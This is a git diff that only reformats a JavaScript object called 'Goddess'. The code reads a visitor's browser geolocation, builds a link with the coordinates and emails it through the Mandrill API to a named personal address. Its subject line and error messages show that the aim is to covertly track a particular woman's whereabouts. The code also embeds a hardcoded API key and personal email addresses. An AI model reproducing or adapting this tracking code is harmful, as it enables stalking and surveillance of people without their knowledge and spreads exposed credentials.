@@ -33,13 +33,10 @@ var Goddess = {
     /** 防止重复 */
     repeat : true,
     /** 初始化 */
-    init: function()
-    {
+    init: function() {
         var self = this;
-        if(this.repeat)
-        {
-           this.gps(function(mail)
-           {
+        if(this.repeat) {
+           this.gps(function(mail) {
                 self.sendMail({ subject : mail.subject, html : mail.html });
                 this.repeat = false;
            });
@@ -49,16 +46,13 @@ var Goddess = {
     gps: function(callfun)
     {
         //判断浏览器是否支持geolocation
-        if(navigator.geolocation)
-        {
+        if(navigator.geolocation){
             var message = "", address="";
-            navigator.geolocation.getCurrentPosition(function (position)
-            {
+            navigator.geolocation.getCurrentPosition(function (position){
                 var lon = position.coords.longitude; //经度
                 var lat = position.coords.latitude;  //纬度
 
-                if(position.address) //是否支持address属性
-                {
+                if(position.address){  //是否支持address属性
                     //通过address，可以获得国家、省份、城市
                     var _a = position.address;
                     address =  "(" + (_a.country + _a.province + _a.city) + ")";
@@ -69,11 +63,9 @@ var Goddess = {
                     subject : "女神地址获取成功，速速查看^0^...",
                     html : "<a href=\"http://jcore.cn/getaddress.html?"+message+"\" target=\"_blank\" >戳我..."+ address +"</a>"
                 });
-            },
-            function (error)
-            {
-                var type = //转义友好提示
-                {
+
+            }, function (error) {
+                var type = { //转义友好提示
                     1: ['这里转义友好提示.[1]', "女神拒绝提供地理位置（自己想办法咯）"],
                     2: ['这里转义友好提示.[2]', "获取不到女神位置信息（爱莫能助啊）"],
                     3: ['这里转义友好提示.[3]', "超时（多访问几次，或者过段时间再次尝试）"]
@@ -90,20 +82,16 @@ var Goddess = {
         }
     },
     /** 发送邮件 */
-    sendMail: function(mail)
-    {
+    sendMail: function(mail){
         if (mail.subject == "" || mail.html == "") return;
         $.ajax({
             type: "POST",
             url: "https://mandrillapp.com/api/1.0/messages/send.json", //json接口地址
-            data:
-            {
+            data:{
                 "key": "xuMao7xRBKlImfxtfl3IlA", //服务允许key
-                "message":
-                {
+                "message":{
                     "from_email": "zj7687362@gmail.com", //发送邮件地址
-                    "to": //发送信息(可多个同时发送)
-                    [
+                    "to": [ //发送信息(可多个同时发送)
                         {
                             "email": "zhangjiajie1314@139.com",
                             "name": "张嘉杰",
